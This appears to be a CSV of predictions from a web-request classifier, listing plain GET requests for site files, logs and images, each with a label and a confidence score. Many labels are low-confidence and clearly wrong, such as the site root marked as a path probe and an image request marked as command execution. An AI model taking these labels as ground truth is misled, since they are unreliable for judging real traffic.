row_idx,text,pred_label,max_prob
65,METHOD=GET PATH=/self.logs/access.log.2020-06-02.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4481620192527771
66,METHOD=GET PATH=/self.logs/access.log.2018-05-07.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.467984139919281
67,METHOD=GET PATH=/self.logs/access.log.2017-01-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45595598220825195
68,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
69,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
70,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
71,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
72,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
73,METHOD=GET PATH=/self.logs/access.log.2020-11-20.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4740222692489624
74,METHOD=GET PATH=/self.logs/error.log.2020-10-01 QUERY= PROTOCOL=HTTP/1.1,benign,0.5044580101966858
75,METHOD=GET PATH=/self.logs/access.log.2021-06-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4590235650539398
76,METHOD=GET PATH=/self.logs/error.log.2019-05-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41845908761024475
77,METHOD=GET PATH=/self.logs/access.log.2020-12-22.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.47734060883522034
78,METHOD=GET PATH=/self.logs/error.log.2021-06-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42460423707962036
79,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
80,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
81,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
82,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
83,METHOD=GET PATH=/self.logs/access.log.2019-12-29.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4717639684677124
84,METHOD=GET PATH=/self.logs/error.log.2020-11-26.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4105055034160614
85,METHOD=GET PATH=/self.logs/error.log.2017-07-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4047729969024658
86,METHOD=GET PATH=/self.logs/access.log.2018-03-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45636746287345886
87,METHOD=GET PATH=/self.logs/access.log.2020-01-12.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4696837365627289
88,METHOD=GET PATH=/self.logs/access.log.2019-01-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4617648720741272
89,METHOD=GET PATH=/self.logs/error.log.2017-07-10.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4233303666114807
90,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
91,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
92,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
93,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
94,METHOD=GET PATH=/self.logs/error.log.2019-12-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41245225071907043
95,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
96,METHOD=GET PATH=/self.logs/access.log.2020-02-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44406658411026
97,METHOD=GET PATH=/self.logs/access.log.2018-06-30.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44656065106391907
98,METHOD=GET PATH=/self.logs/access.log.2017-10-01.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.47216519713401794
99,METHOD=GET PATH=/self.logs/error.log.2020-02-13.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4057396948337555
100,METHOD=GET PATH=/self.logs/error.log.2018-03-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4141730070114136
101,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
102,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
103,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
104,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
105,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
106,METHOD=GET PATH=/self.logs/access.log.2018-02-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4508277475833893
107,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
108,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/loaded_scripts.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6321981549263
109,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
110,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
111,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
112,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
113,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
114,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
115,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
116,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
117,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
118,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
119,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
120,METHOD=GET PATH=/self.logs/access.log.2017-03-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44173333048820496
121,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
122,METHOD=GET PATH=/self.logs/access.log.2021-09-30.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4532565772533417
123,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
124,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
125,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
126,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711091041565
127,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874844551086426
128,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
129,METHOD=GET PATH=/tg/a.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.8342914581298828
130,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
131,METHOD=GET PATH=/self.logs/access.log.2017-09-15.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.46399638056755066
132,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
133,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
134,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
135,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
136,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
137,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
